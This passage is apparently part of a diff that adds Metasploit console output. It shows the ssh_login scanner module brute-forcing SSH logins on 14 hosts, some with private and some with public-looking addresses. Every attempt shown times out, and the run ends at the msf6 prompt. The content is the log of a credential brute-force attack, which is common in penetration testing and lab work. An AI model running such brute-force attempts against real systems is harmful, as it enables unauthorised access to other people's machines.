+[-] Could not connect: The connection with (5.194.202.140:22) timed out.                                                                                                                                                
+[-] Could not connect: The connection with (5.194.202.140:22) timed out.                                                                                                                                                
+[*] 10.159.114.40:22 - Starting bruteforce                                                                                                                                                                              
+[-] Could not connect: The connection with (10.159.114.40:22) timed out.                                                                                                                                                
+[-] Could not connect: The connection with (10.159.114.40:22) timed out.                                                                                                                                                
+[-] Could not connect: The connection with (10.159.114.40:22) timed out.                                                                                                                                                
+[*] Scanned  9 of 14 hosts (64% complete)                                          
+[*] 10.161.59.69:22 - Starting bruteforce                                          
+[-] Could not connect: The connection with (10.161.59.69:22) timed out.            
+[-] Could not connect: The connection with (10.161.59.69:22) timed out.            
+[-] Could not connect: The connection with (10.161.59.69:22) timed out.            
+[*] Scanned 10 of 14 hosts (71% complete)                                          
+[*] 5.211.4.253:22 - Starting bruteforce                                           
+[-] Could not connect: The connection with (5.211.4.253:22) timed out.             
+[-] Could not connect: The connection with (5.211.4.253:22) timed out.             
+[-] Could not connect: The connection with (5.211.4.253:22) timed out.             
+[*] 10.161.28.44:22 - Starting bruteforce                                          
+[-] Could not connect: The connection with (10.161.28.44:22) timed out.            
+[-] Could not connect: The connection with (10.161.28.44:22) timed out.
+[-] Could not connect: The connection with (10.161.28.44:22) timed out.
+[*] Scanned 12 of 14 hosts (85% complete)
+[*] 10.159.44.155:22 - Starting bruteforce
+[-] Could not connect: The connection with (10.159.44.155:22) timed out.
+[-] Could not connect: The connection with (10.159.44.155:22) timed out.
+[-] Could not connect: The connection with (10.159.44.155:22) timed out.
+[*] Scanned 13 of 14 hosts (92% complete)
+[*] 10.159.114.41:22 - Starting bruteforce
+[-] Could not connect: The connection with (10.159.114.41:22) timed out.
+[-] Could not connect: The connection with (10.159.114.41:22) timed out.
+[-] Could not connect: The connection with (10.159.114.41:22) timed out.
+[*] Scanned 14 of 14 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) > 
